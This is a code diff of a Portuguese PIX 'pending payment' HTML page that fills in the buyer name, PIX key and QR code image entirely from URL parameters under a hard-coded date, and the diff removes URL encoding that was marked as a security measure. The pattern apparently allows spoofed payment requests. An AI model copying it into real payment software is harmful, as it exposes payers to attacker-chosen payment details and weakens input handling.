@@ -135,15 +135,12 @@
             </div>
             <div class="value-date" style="text-align: center;">
                 <label>Data</label>
-                <p style="margin: 1px 0 px -4px 0px;">
-                    <span style="font-size: 16px;">18/10/2024</span><br>
-                    <span style="font-size: 16px;">19:32:49</span>
-                </p>
+                <p style="margin: 1px 0px -4px 0px;"><span style="font-size: 16px;">18/10/2024</span><br><span style="font-size: 16px;">19:32:49</span></p>
             </div>
         </div>
-        <div class=" status-alert">
+        <div class="status-alert">
             <img src="erro.png" alt="Erro">
-            <div class="status-text">
+            <div class=" status-text">
                 <strong style="font-size: 16px; color: red;">PIX Pendente!</strong><br>
                 Aguardando Pagamento...
             </div>
@@ -152,8 +149,6 @@
             <h2>Dados do Comprador:</h2>
             <label>Nome</label>
             <p id="nome"></p>
-            <label>CNPJ</label>
-            <p id="cnpj"></p>
             <label>Chave PIX</label>
             <p id="pix">
                 <span onclick="navigator.clipboard.writeText(document.getElementById('pix').textContent); alert('PIX COPIA E COLA COPIADO!');" style="cursor: pointer;">Copiar Chave PIX</span>
@@ -202,18 +197,19 @@
             if (queryParams.nome) {
                 document.getElementById('nome').textContent = queryParams.nome;
             }
-            if (queryParams.cnpj) {
-                document.getElementById('cnpj').textContent = queryParams.cnpj;
-            }
             if (queryParams.pix) {
                 document.getElementById('pix').textContent = queryParams.pix;
+            }
+            if (queryParams.qrcode) {
+                // Use a imagem diretamente se qrcode estiver definido
+                document.getElementById('qrcode').src = queryParams.qrcode;
+            } else if (queryParams.pix) {
                 // Use a API do Google Charts para gerar o QR Code
-                var qrCodeUrl = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(queryParams.pix)}`; // Adicione encodeURIComponent para segurança
-                document.getElementById('qrcode').src = qrCodeUrl;
+                document.getElementById('qrcode').src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${queryParams.pix}`;
             }
             // Atualiza a data e a hora ao carregar a página
             updateDateTime();
         };
     </script>
 </body>
-</html> ```html
+</html>
